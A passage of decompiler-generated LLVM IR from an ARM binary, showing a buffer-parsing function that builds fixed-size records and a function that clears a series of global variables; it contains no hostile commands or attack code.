  %v9_a024 = icmp eq i32 %v1_a020, %v3_9fe4
  br i1 %v9_a024, label %dec_label_pc_a02c, label %dec_label_pc_a010

dec_label_pc_a02c:                                ; preds = %dec_label_pc_a020, %dec_label_pc_9fe0, %dec_label_pc_a034
  %v1_a030 = call i32 @function_12f30(i32 0)
  %v0_a044.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %dec_label_pc_a010, %dec_label_pc_9ff0, %dec_label_pc_a02c
  %v0_a044 = phi i32 [ %v2_9ff8, %dec_label_pc_9ff0 ], [ %v0_a044.pre, %dec_label_pc_a02c ], [ %v7_a010, %dec_label_pc_a010 ]
  %v1_a044 = inttoptr i32 %v0_a044 to i32*
  %v2_a044 = load i32, i32* %v1_a044, align 4
  call void @__pseudo_branch(i32 %v2_a044)
  br label %dec_label_pc_a02c

; uselistorder directives
  uselistorder i32 %v1_a020, { 2, 0, 1 }
  uselistorder i32 %v0_9fa4, { 1, 2, 0 }
  uselistorder i1 %v7_9f7c, { 1, 0 }
  uselistorder i32 %v0_9f78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a034, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a02c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a020, { 1, 0 }
  uselistorder label %dec_label_pc_9fe0, { 1, 0 }
  uselistorder label %dec_label_pc_9fd8, { 1, 0 }
  uselistorder label %dec_label_pc_9f9c, { 1, 0 }
}

define i32 @function_a05c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_a05c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_a060 = icmp ugt i32 %arg2, 2
  %v7_a060 = icmp eq i32 %arg2, 3
  store i1 %v7_a060, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_a06c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a06c, i32* @r5, align 4
  %v2_a070 = xor i1 %v7_a060, true
  %v3_a070 = and i1 %v2_a060, %v2_a070
  br i1 %v3_a070, label %dec_label_pc_a080, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_a0b0, %.dec_label_pc_a074_crit_edge, %dec_label_pc_a0a4, %dec_label_pc_a094, %dec_label_pc_a080, %dec_label_pc_a05c, %dec_label_pc_a25c
  %v1_a07c = phi i32 [ %v1_a07c.pre, %.dec_label_pc_a074_crit_edge ], [ %v1_a084, %dec_label_pc_a0b0 ], [ %v1_a084, %dec_label_pc_a0a4 ], [ %v1_a084, %dec_label_pc_a094 ], [ %v1_a084, %dec_label_pc_a080 ], [ %v0_a06c, %dec_label_pc_a05c ], [ %v1_a260, %dec_label_pc_a25c ]
  ret i32 %v1_a07c

dec_label_pc_a080:                                ; preds = %dec_label_pc_a05c
  %v1_a080 = inttoptr i32 %v0_a06c to i32*
  %v2_a080 = load i32, i32* %v1_a080, align 4
  store i32 %v2_a080, i32* %r0.global-to-local, align 4
  %v1_a084 = call i32 @function_14a1c(i32 %v2_a080)
  store i32 %v1_a084, i32* %r0.global-to-local, align 4
  %v0_a088 = load i32, i32* @r4, align 4
  %v7_a088 = icmp eq i32 %v0_a088, 4
  store i1 %v7_a088, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a084, i32* @fp, align 4
  br i1 %v7_a088, label %dec_label_pc_a074, label %dec_label_pc_a094

dec_label_pc_a094:                                ; preds = %dec_label_pc_a080
  %v0_a094 = load i32, i32* @r5, align 4
  %v1_a094 = add i32 %v0_a094, 4
  %v2_a094 = inttoptr i32 %v1_a094 to i8*
  %v3_a094 = load i8, i8* %v2_a094, align 1
  %v4_a094 = zext i8 %v3_a094 to i32
  %v7_a098 = icmp eq i32 %v0_a088, 5
  store i1 %v7_a098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a098, label %dec_label_pc_a074, label %dec_label_pc_a0a4

dec_label_pc_a0a4:                                ; preds = %dec_label_pc_a094
  %v1_a0a4 = add i32 %v0_a094, 5
  %v2_a0a4 = inttoptr i32 %v1_a0a4 to i8*
  %v3_a0a4 = load i8, i8* %v2_a0a4, align 1
  %v4_a0a4 = zext i8 %v3_a0a4 to i32
  store i32 %v4_a0a4, i32* @sb, align 4
  %v2_a0a8 = icmp eq i8 %v3_a0a4, 0
  store i1 %v2_a0a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a0a8, label %dec_label_pc_a074, label %dec_label_pc_a0b0

dec_label_pc_a0b0:                                ; preds = %dec_label_pc_a0a4
  %v2_a0b4 = mul nuw nsw i32 %v4_a0a4, 5
  store i32 %v2_a0b4, i32* @r7, align 4
  %v1_a0b8 = add i32 %v0_a088, -6
  store i32 %v1_a0b8, i32* %r3.global-to-local, align 4
  %v3_a0bc = icmp ult i32 %v1_a0b8, %v2_a0b4
  %v9_a0bc = icmp eq i32 %v1_a0b8, %v2_a0b4
  store i1 %v9_a0bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a0bc, label %dec_label_pc_a074, label %dec_label_pc_a0c4

dec_label_pc_a0c4:                                ; preds = %dec_label_pc_a0b0
  store i32 %v4_a0a4, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_a0b8, i32* @r6, align 4
  %v2_a0d0 = call i32 @function_13258(i32 %v4_a0a4, i32 24)
  store i32 %v2_a0d0, i32* %ip.global-to-local, align 4
  %v0_a0dc = load i32, i32* @r7, align 4
  %v1_a0dc = load i32, i32* @r4, align 4
  %v2_a0dc = sub i32 %v1_a0dc, %v0_a0dc
  store i32 %v2_a0dc, i32* @r7, align 4
  %v0_a0e0 = load i32, i32* @r5, align 4
  %v1_a0e0 = add i32 %v0_a0e0, 11
  store i32 %v1_a0e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0e4

dec_label_pc_a0e4:                                ; preds = %dec_label_pc_a0e4, %dec_label_pc_a0c4
  %v1_a0e8 = phi i32 [ %v1_a114, %dec_label_pc_a0e4 ], [ %v2_a0d0, %dec_label_pc_a0c4 ]
  %v0_a0e4 = phi i32 [ %v1_a110, %dec_label_pc_a0e4 ], [ %v1_a0e0, %dec_label_pc_a0c4 ]
  %v1_a0e4 = add i32 %v0_a0e4, -5
  %v2_a0e4 = inttoptr i32 %v1_a0e4 to i32*
  %v3_a0e4 = load i32, i32* %v2_a0e4, align 4
  store i32 %v3_a0e4, i32* %r1.global-to-local, align 4
  %v2_a0e8 = add i32 %v1_a0e8, 16
  %v3_a0e8 = inttoptr i32 %v2_a0e8 to i32*
  store i32 %v3_a0e4, i32* %v3_a0e8, align 4
  %v0_a0ec = load i32, i32* @r7, align 4
  %v1_a0ec = add i32 %v0_a0ec, -6
  store i32 %v1_a0ec, i32* %r3.global-to-local, align 4
  %v0_a0f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_a0f0 = add i32 %v0_a0f0, -1
  %v2_a0f0 = inttoptr i32 %v1_a0f0 to i8*
  %v3_a0f0 = load i8, i8* %v2_a0f0, align 1
  %v4_a0f0 = zext i8 %v3_a0f0 to i32
  store i32 %v4_a0f0, i32* @r2, align 4
  %v0_a0f4 = load i32, i32* @r6, align 4
  %v1_a0f4 = add i32 %v0_a0f4, -5
  store i32 %v1_a0f4, i32* @r6, align 4
  %v9_a0f8 = icmp eq i32 %v1_a0f4, %v1_a0ec
  store i1 %v9_a0f8, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_a0f0, i32* @r4, align 4
  %v2_a104 = load i32, i32* %ip.global-to-local, align 4
  %v3_a104 = add i32 %v2_a104, 20
  %v4_a104 = inttoptr i32 %v3_a104 to i8*
  store i8 %v3_a0f0, i8* %v4_a104, align 1
  %v0_a108 = load i32, i32* %r1.global-to-local, align 4
  %v1_a108 = load i32, i32* %ip.global-to-local, align 4
  %v2_a108 = add i32 %v1_a108, 4
  %v3_a108 = inttoptr i32 %v2_a108 to i32*
  store i32 %v0_a108, i32* %v3_a108, align 4
  %v0_a10c = load i32, i32* %r3.global-to-local, align 4
  %v1_a10c = trunc i32 %v0_a10c to i16
  %v2_a10c = load i32, i32* %ip.global-to-local, align 4
  %v3_a10c = inttoptr i32 %v2_a10c to i16*
  store i16 %v1_a10c, i16* %v3_a10c, align 2
  %v0_a110 = load i32, i32* %r0.global-to-local, align 4
  %v1_a110 = add i32 %v0_a110, 5
  store i32 %v1_a110, i32* %r0.global-to-local, align 4
  %v0_a114 = load i32, i32* %ip.global-to-local, align 4
  %v1_a114 = add i32 %v0_a114, 24
  store i32 %v1_a114, i32* %ip.global-to-local, align 4
  %v0_a118 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a118, label %dec_label_pc_a11c, label %dec_label_pc_a0e4

dec_label_pc_a11c:                                ; preds = %dec_label_pc_a0e4
  %v0_a11c = load i32, i32* @r6, align 4
  %v2_a11c = icmp eq i32 %v0_a11c, 0
  store i1 %v2_a11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a11c, label %dec_label_pc_a220, label %dec_label_pc_a124

dec_label_pc_a124:                                ; preds = %dec_label_pc_a11c
  %v0_a124 = load i32, i32* @r4, align 4
  %v1_a124 = inttoptr i32 %v0_a124 to i8*
  %v2_a124 = load i8, i8* %v1_a124, align 1
  %v3_a124 = zext i8 %v2_a124 to i32
  store i32 %v3_a124, i32* @r5, align 4
  %v2_a128 = icmp eq i8 %v2_a124, 0
  store i1 %v2_a128, i1* %cpsr_z.global-to-local, align 1
  %v0_a12c = load i32, i32* @r7, align 4
  %v1_a12c = add i32 %v0_a12c, -7
  store i32 %v1_a12c, i32* @r8, align 4
  br i1 %v2_a128, label %bb, label %dec_label_pc_a138

bb:                                               ; preds = %dec_label_pc_a124
  store i32 %v3_a124, i32* @r6, align 4
  br label %dec_label_pc_a1fc

dec_label_pc_a138:                                ; preds = %dec_label_pc_a124
  store i32 %v3_a124, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a140 = call i32 @function_13258(i32 %v3_a124, i32 8)
  store i32 %v2_a140, i32* %r0.global-to-local, align 4
  %v0_a144 = load i32, i32* @r8, align 4
  %v2_a144 = icmp eq i32 %v0_a144, 0
  store i1 %v2_a144, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a140, i32* @r6, align 4
  br i1 %v2_a144, label %dec_label_pc_a220, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a138
  %v0_a150 = load i32, i32* @r4, align 4
  %v1_a150 = add i32 %v0_a150, 1
  %v2_a150 = inttoptr i32 %v1_a150 to i8*
  %v3_a150 = load i8, i8* %v2_a150, align 1
  %v0_a154 = load i32, i32* @r7, align 4
  %v7_a154 = icmp eq i32 %v0_a154, 8
  store i1 %v7_a154, i1* %cpsr_z.global-to-local, align 1
  %v3_a158 = add i32 %v2_a140, 4
  %v4_a158 = inttoptr i32 %v3_a158 to i8*
  store i8 %v3_a150, i8* %v4_a158, align 1
  %v0_a15c = load i32, i32* @r4, align 4
  %v1_a15c = add i32 %v0_a15c, 1
  store i32 %v1_a15c, i32* %r3.global-to-local, align 4
  %v0_a160 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a160, label %dec_label_pc_a220, label %dec_label_pc_a164

dec_label_pc_a164:                                ; preds = %dec_label_pc_a150
  %v1_a164 = add i32 %v0_a15c, 2
  %v2_a164 = inttoptr i32 %v1_a164 to i8*
  %v3_a164 = load i8, i8* %v2_a164, align 1
  %v4_a164 = zext i8 %v3_a164 to i32
  store i32 %v4_a164, i32* @r4, align 4
  %v0_a168 = load i32, i32* @r7, align 4
  %v1_a168 = add i32 %v0_a168, -9
  store i32 %v1_a168, i32* @r8, align 4
  %v9_a16c = icmp eq i32 %v1_a168, %v4_a164
  store i1 %v9_a16c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a164, i32* %r1.global-to-local, align 4
  %v5_a174 = icmp slt i32 %v1_a168, %v4_a164
  br i1 %v5_a174, label %dec_label_pc_a220, label %bb35

bb35:                                             ; preds = %dec_label_pc_a164
  %v7_a1787 = add i32 %v0_a15c, 3
  store i32 %v7_a1787, i32* @r7, align 4
  %v6_a17c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_a17c, i32* @sl, align 4
  br label %dec_label_pc_a1c0

dec_label_pc_a18c:                                ; preds = %dec_label_pc_a1c0
  %v0_a18c = load i32, i32* @r8, align 4
  %v1_a18c = load i32, i32* @r4, align 4
  %v2_a18c = sub i32 %v0_a18c, %v1_a18c
  store i32 %v2_a18c, i32* @r2, align 4
  %v9_a18c = icmp eq i32 %v0_a18c, %v1_a18c
  store i1 %v9_a18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a18c, label %dec_label_pc_a220, label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %dec_label_pc_a18c
  %v1_a194 = load i32, i32* @r7, align 4
  %v2_a194 = add i32 %v1_a194, %v1_a18c
  %v3_a194 = inttoptr i32 %v2_a194 to i8*
  %v4_a194 = load i8, i8* %v3_a194, align 1
  store i32 %v2_a194, i32* %r0.global-to-local, align 4
  %v1_a19c = add i32 %v2_a18c, -1
  store i32 %v1_a19c, i32* @r2, align 4
  %v7_a19c = icmp eq i32 %v2_a18c, 1
  store i1 %v7_a19c, i1* %cpsr_z.global-to-local, align 1
  %v3_a1a0 = add i32 %v2_a1f4, 4
  %v4_a1a0 = inttoptr i32 %v3_a1a0 to i8*
  store i8 %v4_a194, i8* %v4_a1a0, align 1
  %v0_a1a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_a1a4 = add i32 %v0_a1a4, 1
  store i32 %v1_a1a4, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r2, align 4
  %v1_a1a8 = add i32 %v0_a1a8, -1
  store i32 %v1_a1a8, i32* @r8, align 4
  %v1_a1ac = add i32 %v0_a1a4, 2
  store i32 %v1_a1ac, i32* @r7, align 4
  %v0_a1b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1b0, label %dec_label_pc_a220, label %dec_label_pc_a1b4

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a194
  %v2_a1b4 = inttoptr i32 %v1_a1a4 to i8*
  %v3_a1b4 = load i8, i8* %v2_a1b4, align 1
  %v4_a1b4 = zext i8 %v3_a1b4 to i32
  store i32 %v4_a1b4, i32* @r4, align 4
  %v2_a1b8 = sub i32 %v1_a1a8, %v4_a1b4
  %tmp36 = sub i32 0, %v2_a1b8
  %v6_a1b8 = and i32 %v1_a1a8, %tmp36
  %v7_a1b8 = icmp slt i32 %v6_a1b8, 0
  %v8_a1b8 = icmp slt i32 %v2_a1b8, 0
  %v9_a1b8 = icmp eq i32 %v1_a1a8, %v4_a1b4
  store i1 %v9_a1b8, i1* %cpsr_z.global-to-local, align 1
  %v2_a1bc = xor i1 %v8_a1b8, %v7_a1b8
  br i1 %v2_a1bc, label %dec_label_pc_a220, label %dec_label_pc_a1c0

dec_label_pc_a1c0:                                ; preds = %bb35, %dec_label_pc_a1b4
  %v0_a1c4 = phi i32 [ %v4_a164, %bb35 ], [ %v4_a1b4, %dec_label_pc_a1b4 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_a1d4, %dec_label_pc_a1b4 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_a1c4 = add nuw nsw i32 %v0_a1c4, 1
  store i32 %v1_a1c4, i32* %r0.global-to-local, align 4
  %v2_a1c8 = call i32 @function_13258(i32 %v1_a1c4, i32 1)
  store i32 %v2_a1c8, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_a1d0 = load i32, i32* @sl, align 4
  %v2_a1d0 = inttoptr i32 %v1_a1d0 to i32*
  store i32 %v2_a1c8, i32* %v2_a1d0, align 4
  %v0_a1d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a1d4 = add i32 %v0_a1d4, 1
  store i32 %v1_a1d4, i32* %r3.global-to-local, align 4
  %v0_a1d8 = load i32, i32* @r4, align 4
  %v0_a1dc = load i32, i32* @r7, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  %v3_a1e4 = call i32 @function_123e0(i32 %v2_a1c8, i32 %v0_a1dc, i32 %v0_a1d8)
  store i32 %v3_a1e4, i32* %r0.global-to-local, align 4
  %v3_a1ec = mul i32 %v1_a1d4, 8
  store i32 %v3_a1ec, i32* %r3.global-to-local, align 4
  %v1_a1f0 = load i32, i32* @r5, align 4
  %v9_a1f0 = icmp eq i32 %v1_a1d4, %v1_a1f0
  store i1 %v9_a1f0, i1* %cpsr_z.global-to-local, align 1
  %v0_a1f4 = load i32, i32* @r6, align 4
  %v2_a1f4 = add i32 %v0_a1f4, %v3_a1ec
  store i32 %v2_a1f4, i32* @sl, align 4
  br i1 %v9_a1f0, label %dec_label_pc_a1fc, label %dec_label_pc_a18c

dec_label_pc_a1fc:                                ; preds = %dec_label_pc_a1c0, %bb
  %v0_a1fc = call i32 @function_12f18()
  %v2_a204 = inttoptr i32 %v0_a1fc to i32*
  store i32 0, i32* %v2_a204, align 4
  store i32 %v4_a094, i32* %r1.global-to-local, align 4
  %v0_a20c = load i32, i32* @fp, align 4
  store i32 %v0_a20c, i32* %r0.global-to-local, align 4
  %v0_a210 = load i32, i32* @sb, align 4
  store i32 %v2_a0d0, i32* %r3.global-to-local, align 4
  %v2_a218 = load i32, i32* @r5, align 4
  %v5_a218 = load i32, i32* @r6, align 4
  %v6_a21c = trunc i32 %v2_a218 to i8
  %v7_a21c = call i32 @function_9f60(i32 %v0_a20c, i32 %v4_a094, i32 %v0_a210, i32 %v2_a0d0, i8 %v6_a21c, i32 %v5_a218)
  store i32 %v7_a21c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a220

dec_label_pc_a220:                                ; preds = %dec_label_pc_a1b4, %dec_label_pc_a194, %dec_label_pc_a18c, %dec_label_pc_a164, %dec_label_pc_a150, %dec_label_pc_a138, %dec_label_pc_a11c, %dec_label_pc_a1fc
  store i32 %v2_a0d0, i32* %r3.global-to-local, align 4
  %v2_a224 = icmp eq i32 %v2_a0d0, 0
  store i1 %v2_a224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a224, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_a220
  store i32 %v2_a0d0, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_a220, %bb37
  store i32 41520, i32* @lr, align 4
  %v1_a22c = xor i1 %v2_a224, true
  call void @__pseudo_cond_branch(i1 %v1_a22c, i32 ptrtoint (i32* @global_var_137cc.57 to i32))
  %v0_a230 = load i32, i32* @r6, align 4
  %v2_a230 = icmp eq i32 %v0_a230, 0
  store i1 %v2_a230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a230, label %.dec_label_pc_a074_crit_edge, label %dec_label_pc_a238

.dec_label_pc_a074_crit_edge:                     ; preds = %bb38
  %v1_a07c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a074

dec_label_pc_a238:                                ; preds = %bb38
  %v0_a238 = load i32, i32* @r5, align 4
  %v2_a238 = icmp eq i32 %v0_a238, 0
  store i1 %v2_a238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a238, label %dec_label_pc_a25c, label %dec_label_pc_a240

dec_label_pc_a240:                                ; preds = %dec_label_pc_a238
  br label %dec_label_pc_a244

dec_label_pc_a244:                                ; preds = %dec_label_pc_a244, %dec_label_pc_a240
  %v0_a24c = phi i32 [ 0, %dec_label_pc_a240 ], [ %v1_a254, %dec_label_pc_a244 ]
  %v0_a244 = phi i32 [ %v0_a230, %dec_label_pc_a240 ], [ %v0_a25c.pre, %dec_label_pc_a244 ]
  %v4_a244 = mul i32 %v0_a24c, 8
  %v5_a244 = add i32 %v4_a244, %v0_a244
  %v6_a244 = inttoptr i32 %v5_a244 to i32*
  %v7_a244 = load i32, i32* %v6_a244, align 4
  store i32 %v7_a244, i32* %r0.global-to-local, align 4
  %v2_a248 = icmp eq i32 %v7_a244, 0
  store i1 %v2_a248, i1* %cpsr_z.global-to-local, align 1
  %v1_a24c = add i32 %v0_a24c, 1
  store i32 %v1_a24c, i32* @r4, align 4
  store i32 41556, i32* @lr, align 4
  %v1_a250 = xor i1 %v2_a248, true
  call void @__pseudo_cond_branch(i1 %v1_a250, i32 ptrtoint (i32* @global_var_137cc.57 to i32))
  %v0_a254 = load i32, i32* @r5, align 4
  %v1_a254 = load i32, i32* @r4, align 4
  %v9_a254 = icmp eq i32 %v0_a254, %v1_a254
  store i1 %v9_a254, i1* %cpsr_z.global-to-local, align 1
  %v0_a25c.pre = load i32, i32* @r6, align 4
  br i1 %v9_a254, label %dec_label_pc_a25c, label %dec_label_pc_a244

dec_label_pc_a25c:                                ; preds = %dec_label_pc_a244, %dec_label_pc_a238
  %v0_a25c = phi i32 [ %v0_a230, %dec_label_pc_a238 ], [ %v0_a25c.pre, %dec_label_pc_a244 ]
  store i32 %v0_a25c, i32* %r0.global-to-local, align 4
  %v1_a260 = call i32 @function_137cc(i32 %v0_a25c)
  store i32 %v1_a260, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a074

; uselistorder directives
  uselistorder i32 %v1_a260, { 1, 0 }
  uselistorder i32 %v0_a25c, { 1, 0 }
  uselistorder i32 %v1_a254, { 1, 0 }
  uselistorder i1 %v2_a224, { 0, 2, 1 }
  uselistorder i32 %v2_a1f4, { 1, 0 }
  uselistorder i32 %v3_a1ec, { 1, 0 }
  uselistorder i32 %v1_a1d4, { 2, 0, 3, 1 }
  uselistorder i32 %v2_a1b8, { 1, 0 }
  uselistorder i32 %v4_a1b4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a1a8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a124, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a114, { 1, 0 }
  uselistorder i32 %v1_a110, { 1, 0 }
  uselistorder i32 %v2_a0d0, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_a0a4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a084, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v0_a06c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 7, 4, 5, 19, 6, 3, 8, 2, 12, 11, 9, 10, 18, 20, 13, 14, 15, 16, 17, 21, 23, 22, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_a220, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_a1c0, { 1, 0 }
  uselistorder label %dec_label_pc_a074, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @function_a268(i32 %arg1) local_unnamed_addr {
dec_label_pc_a268:
  store i32 %arg1, i32* @r2, align 4
  store i32 ptrtoint (i32* @global_var_2237c.59 to i32), i32* @r4, align 4
  %v2_a270 = load i32, i32* @global_var_2237c.59, align 4
  store i32 %v2_a270, i32* @r0, align 4
  %v2_a274 = icmp eq i32 %v2_a270, 0
  br i1 %v2_a274, label %dec_label_pc_a280, label %dec_label_pc_a308

dec_label_pc_a280:                                ; preds = %dec_label_pc_a268
  %v3_a280 = load i32, i32* @global_var_22380.60, align 4
  store i32 %v3_a280, i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  %v2_a288 = icmp eq i32 %v3_a280, 0
  store i32 0, i32* @global_var_2237c.59, align 4
  br i1 %v2_a288, label %dec_label_pc_a294, label %dec_label_pc_a324

dec_label_pc_a294:                                ; preds = %dec_label_pc_a308.dec_label_pc_a294_crit_edge, %dec_label_pc_a280
  %v0_a29c = phi i32 [ %v0_a29c.pre, %dec_label_pc_a308.dec_label_pc_a294_crit_edge ], [ 0, %dec_label_pc_a280 ]
  %v3_a294 = load i32, i32* @global_var_22384.61, align 4
  store i32 %v3_a294, i32* @r0, align 4
  %v2_a298 = icmp eq i32 %v3_a294, 0
  store i32 %v0_a29c, i32* @global_var_22380.60, align 4
  br i1 %v2_a298, label %dec_label_pc_a2a4, label %dec_label_pc_a33c

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a324
  %v0_a2ac = phi i32 [ %v0_a29c, %dec_label_pc_a294 ], [ %v0_a334, %dec_label_pc_a324 ]
  %v3_a2a4 = load i32, i32* @global_var_22388.62, align 4
  store i32 %v3_a2a4, i32* @r0, align 4
  %v2_a2a8 = icmp eq i32 %v3_a2a4, 0
  store i32 %v0_a2ac, i32* @global_var_22384.61, align 4
  br i1 %v2_a2a8, label %dec_label_pc_a2b4, label %dec_label_pc_a354

dec_label_pc_a2b4:                                ; preds = %dec_label_pc_a2a4, %dec_label_pc_a33c
  %v0_a2bc = phi i32 [ %v0_a2ac, %dec_label_pc_a2a4 ], [ %v0_a34c, %dec_label_pc_a33c ]
  %v3_a2b4 = load i32, i32* @global_var_2238c.63, align 4
  store i32 %v3_a2b4, i32* @r0, align 4
  %v2_a2b8 = icmp eq i32 %v3_a2b4, 0
  store i32 %v0_a2bc, i32* @global_var_22388.62, align 4
  br i1 %v2_a2b8, label %dec_label_pc_a2c4, label %dec_label_pc_a36c

dec_label_pc_a2c4:                                ; preds = %dec_label_pc_a2b4, %dec_label_pc_a354
  %v0_a2cc = phi i32 [ %v0_a2bc, %dec_label_pc_a2b4 ], [ %v0_a364, %dec_label_pc_a354 ]
  %v3_a2c4 = load i32, i32* @global_var_22390.64, align 4
  store i32 %v3_a2c4, i32* @r0, align 4
  %v2_a2c8 = icmp eq i32 %v3_a2c4, 0
  store i32 %v0_a2cc, i32* @global_var_2238c.63, align 4
  br i1 %v2_a2c8, label %dec_label_pc_a2d4, label %dec_label_pc_a384

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a36c
  %v0_a2dc = phi i32 [ %v0_a2cc, %dec_label_pc_a2c4 ], [ %v0_a37c, %dec_label_pc_a36c ]
  %v3_a2d4 = load i32, i32* @global_var_22394.65, align 4
  store i32 %v3_a2d4, i32* @r0, align 4
  %v2_a2d8 = icmp eq i32 %v3_a2d4, 0
  store i32 %v0_a2dc, i32* @global_var_22390.64, align 4
  br i1 %v2_a2d8, label %dec_label_pc_a2e4, label %dec_label_pc_a39c

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a384
  %v0_a2ec = phi i32 [ %v0_a2dc, %dec_label_pc_a2d4 ], [ %v0_a394, %dec_label_pc_a384 ]
  %v3_a2e4 = load i32, i32* @global_var_22398.66, align 4
  store i32 %v3_a2e4, i32* @r0, align 4
  %v2_a2e8 = icmp eq i32 %v3_a2e4, 0
  store i32 %v0_a2ec, i32* @global_var_22394.65, align 4
  br i1 %v2_a2e8, label %dec_label_pc_a2f4, label %dec_label_pc_a3b4

dec_label_pc_a2f4:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a39c, %dec_label_pc_a3b4
  %v0_a2f4 = phi i32 [ %v0_a2ec, %dec_label_pc_a2e4 ], [ %v0_a3ac, %dec_label_pc_a39c ], [ %v0_a2f4.pre, %dec_label_pc_a3b4 ]
  store i32 %v0_a2f4, i32* @global_var_22398.66, align 4
  %v0_a2f8 = call i32 @function_ffe8()
  ret i32 %v0_a2f8

dec_label_pc_a308:                                ; preds = %dec_label_pc_a268
  %v2_a30c = call i32 @function_14e24(i32 %v2_a270, i32 9)
  %v3_a310 = load i32, i32* @global_var_22380.60, align 4
  store i32 %v3_a310, i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  %v2_a318 = icmp eq i32 %v3_a310, 0
  %v1_a31c = load i32, i32* @r4, align 4
  %v2_a31c = inttoptr i32 %v1_a31c to i32*
  store i32 0, i32* %v2_a31c, align 4
  br i1 %v2_a318, label %dec_label_pc_a308.dec_label_pc_a294_crit_edge, label %dec_label_pc_a308.dec_label_pc_a324_crit_edge

dec_label_pc_a308.dec_label_pc_a294_crit_edge:    ; preds = %dec_label_pc_a308
  %v0_a29c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a294

dec_label_pc_a308.dec_label_pc_a324_crit_edge:    ; preds = %dec_label_pc_a308
  %v0_a328.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a308.dec_label_pc_a324_crit_edge, %dec_label_pc_a280
  %v0_a328 = phi i32 [ %v0_a328.pre, %dec_label_pc_a308.dec_label_pc_a324_crit_edge ], [ %v3_a280, %dec_label_pc_a280 ]
  %v2_a328 = call i32 @function_14e24(i32 %v0_a328, i32 9)
  %v3_a32c = load i32, i32* @global_var_22384.61, align 4
  store i32 %v3_a32c, i32* @r0, align 4
  %v2_a330 = icmp eq i32 %v3_a32c, 0
  %v0_a334 = load i32, i32* @r5, align 4
  store i32 %v0_a334, i32* @global_var_22380.60, align 4
